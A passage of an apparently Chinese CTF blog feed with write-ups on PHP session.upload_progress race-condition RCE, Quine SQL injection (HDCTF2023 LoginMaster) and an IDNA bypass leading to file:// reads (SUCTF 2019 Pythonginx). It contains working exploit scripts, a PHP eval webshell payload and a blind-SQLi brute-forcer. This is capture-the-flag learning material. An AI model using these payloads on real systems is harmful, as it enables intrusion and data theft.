<code>session.upload_progress</code> 进行rce</p><h5 id="使用python脚本："><a href="#使用python脚本：" class="headerlink" title="使用python脚本："></a>使用python脚本：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php">import io<br>import threading<br>import requests<br><br>url = <span class="hljs-string">&quot;http://40c7dd6c-b2cb-4356-820b-cd6ba4f81596.node4.buuoj.cn:81/&quot;</span><br>sessid = <span class="hljs-string">&#x27;leekos&#x27;</span><br><br>def <span class="hljs-title function_ invoke__">write</span>(session):<br><br>    filebytes = io.<span class="hljs-title function_ invoke__">BytesIO</span>(b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> True:<br>        session.<span class="hljs-title function_ invoke__">post</span>(url=url,data = &#123;<br>            <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>        &#125;,cookies=&#123;<br>            <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessid<br>        &#125;,files=&#123;<br>            <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;leekos.jpg&#x27;</span>,filebytes)<br>        &#125;)<br><br><br>def <span class="hljs-title function_ invoke__">read</span>(session):<br><br>    <span class="hljs-keyword">while</span> True:<br>        res1 = session.<span class="hljs-title function_ invoke__">post</span>(url=url + r<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid, data=&#123;<br>            <span class="hljs-string">&#x27;1&#x27;</span>: r<span class="hljs-string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span><br>        &#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;leekos&#x27;</span> in res1.text:<br>            <span class="hljs-keyword">print</span>(res1.text)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;retry~~~~&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    with requests.<span class="hljs-title function_ invoke__">session</span>() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">20</span>):<br>            threading.<span class="hljs-title function_ invoke__">Thread</span>(target=write,args=(session,)).<span class="hljs-title function_ invoke__">start</span>()<br>        <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">20</span>):<br>            threading.<span class="hljs-title function_ invoke__">Thread</span>(target=read,args=(session,)).<span class="hljs-title function_ invoke__">start</span>()<br></code></pre></td></tr></table></figure><p>这段代码的逻辑其实不难，得好好补一补python</p><p>首先我们创建一个 <code>session</code>对象，用来发送http请求</p><p>然后使用python中多线程 <code>threading.Thread()</code> 创建多线程并启动然后调用 write、read</p><ul><li>write()函数逻辑：首先使用<code>io.BytesIO(b&#39;a&#39;*1024*50)</code>创建一段50kB大小的文件，然后发送post包，url为域名，data的键名传入：<code>PHP_SESSION_UPLOAD_PROGRESS</code> 值传入一句话木马，然后cookie控制<code>PHSESSID</code>的值为leekos，files传入刚创建的文件。这样就会在服务器 <code>/tmp</code>目录创建一个文件名为：<code>sess_leekos</code>的文件，并且内容包含一句话木马</li><li>read()函数逻辑，去读 <code>/tmp/sess_leekos</code>文件的值，并且data中传入代码获取flag。由于session文件的内容中包含我们上传的文件的名称（此时为：leekos.jpg）如果读取出来的结果包含leekos，说明之前的session上传成功了，于是我们打印出页面的值，其中一定包含flag</li></ul><p>使用多线程不断的竞争，一段时间后就会得到flag</p><p><img src="https://s2.loli.net/2023/06/01/xLnHMGSRYuaJ59f.png" alt="image-20230601210701486"></p><h5 id="使用html-bp"><a href="#使用html-bp" class="headerlink" title="使用html+bp"></a>使用html+bp</h5><p>写一个html</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> content=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;Document&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;form action=<span class="hljs-string">&quot;http://40c7dd6c-b2cb-4356-820b-cd6ba4f81596.node4.buuoj.cn:81/&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-subst">$_POST</span>[1]);?&gt;&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>    &lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>上传文件，抓包，修改<code>cookie:PHPSESSID=leekos</code></p><p><img src="https://s2.loli.net/2023/06/01/JjLhp7enokFA84f.png" alt="image-20230601212928962"></p><p>然后使用另一个请求包含：</p><p><img src="https://s2.loli.net/2023/06/01/jLzxiv4u6Id7cnw.png" alt="image-20230601212949130"></p><p>两个请求使用 <code>Intruder</code>模块竞争：</p><p><img src="https://s2.loli.net/2023/06/01/1Yej2HK8TtqoANn.png" alt="image-20230601213038646"></p><p>这样就成功了</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>session.upload_progress文件包含漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Quine注入</title>
    <link href="/2023/08/24/Quine%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/08/24/Quine%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="Quine注入"><a href="#Quine注入" class="headerlink" title="Quine注入"></a>Quine注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://www.anquanke.com/post/id/253570#h2-9">从三道赛题再谈Quine trick</a></p><p><a href="https://www.cnblogs.com/zhengna/p/15917521.html">CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入）</a></p><p><a href="https://www.cnblogs.com/aninock/p/16467716.html">yet_another_mysql_injection-Qunie</a></p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>看着有点烧脑，其实就是套娃</p><p>我们首先尝试一下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> REPLACE(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/rtYn4WiP9T2D7Io.png" alt="image-20230423153453045"></p><p>输出是一个小数点 .</p><p>我们尝试将 上一段代码中的小数点 <strong>.</strong> 替换为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">REPLACE(&quot;.&quot;,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),&quot;.&quot;)   <span class="hljs-comment">-- 这里使用双引号包裹，防止单双引号重叠</span><br></code></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> REPLACE(<span class="hljs-string">&#x27;REPLACE(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;REPLACE(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/Qsg7HvIrREJfYFN.png" alt="image-20230423153432347"></p><p>乍一看好像是一样的，但是单双引号有点区别，我们需要再套<code>REPLACE</code>替换一下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> replace(replace(<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/yma7of36rFAWenx.png" alt="image-20230423155242323"></p><p>是真的麻烦。。</p><p>基本上就是这种思路了</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="HDCTF2023-LoginMaster"><a href="#HDCTF2023-LoginMaster" class="headerlink" title="[HDCTF2023]LoginMaster"></a>[HDCTF2023]LoginMaster</h4><p><strong>robots.txt泄露</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSql</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="hljs-variable">$s</span>))&#123;<br>        <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-variable">$password</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$FLAG</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&quot;wrong password&quot;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>sql注入题目，username必须为admin，此处我们需要从密码着手</p><p>但是注意看，过滤了 <code>in</code> ，意味着我们不能使用 <code>information_schema</code>库查询表名，列名</p><p>我本来是想找一下除了<code>information_schema</code>库，还有哪些库能用来查询的，找了这么几个：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql.innodb_table_stats<br>sys.schema_table_statistics<br>sys.schema_table_statistics_with_buffer<br></code></pre></td></tr></table></figure><p>这几个都能用来查询表名，此处我们可以使用下面两个，我们我们写脚本去查询表名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://node5.anna.nssctf.cn:28973&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>s = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;_.,&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-comment"># payload = &quot;1&#x27;/**/or/**/if((mid((select/**/version()),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;),1,0)#&quot;.format(i, j) # 10_2_32-mariadb</span><br>        <span class="hljs-comment"># payload = &quot;1&#x27;/**/or/**/if((mid((select/**/database()),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;),1,0)#&quot;.format(i, j) # ciscn</span><br>        <span class="hljs-comment"># payload = &quot;1&#x27;/**/or/**/if((mid((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;),1,0)#&quot;.format(i, j)</span><br>        payload = <span class="hljs-string">&quot;1&#x27;/**/or/**/if((mid((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics/**/where/**/table_schema/**/like/**/&#x27;ciscn&#x27;),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span>.<span class="hljs-built_in">format</span>(i, j)<br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: payload<br>        &#125;<br>        req = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-comment"># print(req.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hacker&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;something&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;someting&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrong password&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            flag += j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>发现啥都查不出来。。</p><p>实际上此处为一张空表，我们需要使用另一种做法(<strong>quine</strong>)</p><p>重点的代码是这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-variable">$password</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$FLAG</span>);<br>    &#125; <br></code></pre></td></tr></table></figure><p>我们除了让输入的密码与真正的密码一致外，还可以让<strong>输入的结果与输出的结果相同</strong>，同样可以实现获得flag</p><p>举个例子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> replace(replace(<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/GhX91m7y3JwE85Y.png" alt="image-20230423152442610"></p><p>输入和输出结果一致，从而可以绕过</p><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;UNION(SELECT(REPLACE(REPLACE(&#x27;</span><span class="hljs-number">1</span>&quot;UNION(SELECT(REPLACE(REPLACE(&quot;<span class="hljs-operator">%</span>&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;<span class="hljs-operator">%</span>&quot;)))#&#x27;,CHAR(34),CHAR(39)),CHAR(37),&#x27;1&quot;<span class="hljs-keyword">UNION</span>(<span class="hljs-keyword">SELECT</span>(REPLACE(REPLACE(&quot;%&quot;,<span class="hljs-type">CHAR</span>(<span class="hljs-number">34</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">CHAR</span>(<span class="hljs-number">37</span>),&quot;%&quot;)))#<span class="hljs-string">&#x27;)))#</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/27/kqJm6GTvw1L2sCU.png" alt="image-20230423155425281"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Quine注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pythonginx</title>
    <link href="/2023/08/24/Pythonginx/"/>
    <url>/2023/08/24/Pythonginx/</url>
    
    <content type="html"><![CDATA[<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>分析一下源代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>():<br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    host = parse.urlparse(url).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 111&quot;</span><br>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))<br>    host = parts[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 222 &quot;</span> + host<br>    newhost = []<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br>    <span class="hljs-comment">#去掉 url 中的空格</span><br>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host = parse.urlparse(finalUrl).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span><br>    &lt;/code&gt;<br>    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;<br>    &lt;!-- Do you know the nginx? --&gt;<br></code></pre></td></tr></table></figure><p>经过分析，我们需要使前面两个if条件为假，但是需要将第三个if为真</p><p>但是我们直接url中包含<code>suctf.cc</code>不可能绕过前面的if判断，肯定需要通过指定的方式将编码转化成<code>suctf.cc</code>的格式</p><p>我们观察一下如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>这里存在一个漏洞：<code>idna编码与utf-8解码漏洞</code></p><p><a href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html">https://www.cnblogs.com/cimuhuashuimu/p/11490431.html</a></p><p>我们可以使用脚本来获得idna编码与utf-8解码后与字符c相等的字符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlsplit, urlunsplit<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>():<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):<br>        uni = <span class="hljs-built_in">chr</span>(x)<br>        url = <span class="hljs-string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(uni)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> get_url(url):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;uni: &quot;</span> + uni + <span class="hljs-string">&quot; url:&quot;</span> + url)<br>                <span class="hljs-comment"># print(uni)</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_url</span>(<span class="hljs-params">url</span>):<br>    url = url<br>    host = parse.urlparse(url).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))<br>    host = parts[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    newhost = []<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br>    <span class="hljs-comment"># 去掉 url 中的空格</span><br>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host = parse.urlparse(finalUrl).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    output()<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">uni: ℂ url:http:<span class="hljs-regexp">//</span>suctf.cℂ<br>uni: ℭ url:http:<span class="hljs-regexp">//</span>suctf.cℭ<br>uni: Ⅽ url:http:<span class="hljs-regexp">//</span>suctf.cⅭ<br>uni: ⅽ url:http:<span class="hljs-regexp">//</span>suctf.cⅽ<br>uni: Ⓒ url:http:<span class="hljs-regexp">//</span>suctf.cⒸ<br>uni: ⓒ url:http:<span class="hljs-regexp">//</span>suctf.cⓒ<br>uni: Ｃ url:http:<span class="hljs-regexp">//</span>suctf.cＣ<br>uni: ｃ url:http:<span class="hljs-regexp">//</span>suctf.cｃ<br></code></pre></td></tr></table></figure><p>我们将这个字符进行url编码后即可使用：<code>%E2%92%B8</code></p><p>这个时候我们可以绕过if了，但是我们如何才能获取到flag呢：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>    <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span><br>&lt;/code&gt;<br>&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;<br>&lt;!-- Do you know the nginx? --&gt;<br></code></pre></td></tr></table></figure><p>注意下面的提示，nginx，所以我们需要知道nginx相关配置文件的路径</p><h4 id="nginx常见配置文件"><a href="#nginx常见配置文件" class="headerlink" title="nginx常见配置文件"></a>nginx常见配置文件</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx">配置文件存放目录：/etc/<span class="hljs-attribute">nginx</span><br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf<br></code></pre></td></tr></table></figure><p>然后我们可以结合<code>file协议</code>来读取文件：</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pythonginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pth文件写入getshell</title>
